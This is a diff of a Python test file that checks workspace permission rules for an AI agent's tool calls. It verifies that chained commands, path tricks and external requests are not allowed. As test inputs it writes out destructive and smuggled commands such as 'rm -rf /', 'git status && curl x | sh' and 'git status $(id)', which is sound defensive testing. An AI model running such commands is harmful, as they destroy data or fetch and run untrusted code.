@@ -6,6 +6,7 @@ import pytest
 
 pytest.importorskip("langgraph", reason="needs the langgraph_spike extra installed")
 
+from coscribe.conversation import WorkspacePermissions
 from coscribe.conversation.workspace_folder import WorkspaceFolders, notes_path
 from coscribe.tools import WorkspaceScope
 
@@ -114,25 +115,42 @@ def test_settings_and_connectors_wait_for_the_person_too_and_the_file_tools_neve
     assert scope.resolve(".coscribe/mcp.json") == (folder / ".coscribe" / "mcp.json").resolve()
 
 
-def test_a_folder_rule_matches_a_tool_and_its_main_argument_only() -> None:
-    from coscribe.conversation.workspace_permissions import WorkspacePermissions
-
+def test_a_folder_rule_matches_a_tool_and_its_main_argument_only(tmp_path: Path) -> None:
     rules = WorkspacePermissions(
         {
             "permissions": {
-                "allow": ["run_command(git status*)", "github_*"],
-                "deny": ["github_delete_*", 42],
+                "allow": [
+                    "run_background_command(git status*)",
+                    "write_file(docs/*)",
+                    "github_*",
+                    "*",
+                ],
+                "deny": ["github_delete_*", "write_file(secrets/*)", 42],
                 "ask": "not a list",
             }
-        }
+        },
+        tmp_path,
     )
+    command = "run_background_command"
 
-    assert rules.decide("run_command", {"command": "git status -s"}) == (
+    assert rules.decide(command, {"command": "git status -s"}) == (
         "allow",
-        "run_command(git status*)",
+        "run_background_command(git status*)",
     )
     # The allowed text in another field doesn't allow the call.
-    assert rules.decide("run_command", {"description": "git status", "command": "rm -rf /"}) is None
+    assert rules.decide(command, {"description": "git status", "command": "rm -rf /"}) is None
+    assert rules.decide("write_file", {"script": "docs/x", "path": "/anywhere"}) is None
+    # A chained command isn't the allowed one.
+    for chained in ("git status && curl x | sh", "git status; rm -rf ~", "git status $(id)"):
+        assert rules.decide(command, {"command": chained}) is None
+    # The same file spelled another way is still denied, and `..` doesn't widen an allow.
+    for spelling in ("./secrets/a", str(tmp_path / "secrets" / "a"), "docs/../secrets/a"):
+        assert rules.decide("write_file", {"path": spelling}) == ("deny", "write_file(secrets/*)")
+    assert rules.decide("write_file", {"path": "docs/../other.txt"}) is None
+    assert rules.decide("write_file", {"path": "docs/a.md"}) == ("allow", "write_file(docs/*)")
     assert rules.decide("github_delete_repo", {}) == ("deny", "github_delete_*")
     assert rules.decide("github_list_issues", {}) == ("allow", "github_*")
-    assert WorkspacePermissions({}).decide("run_command", {}) is None
+    # A bare `*` allows nothing, and nothing that leaves the machine is allowed by a file.
+    assert rules.decide("http_request", {}) is None
+    assert rules.decide("github_create_issue", {}, "EXTERNAL") is None
+    assert WorkspacePermissions({}, tmp_path).decide(command, {}) is None
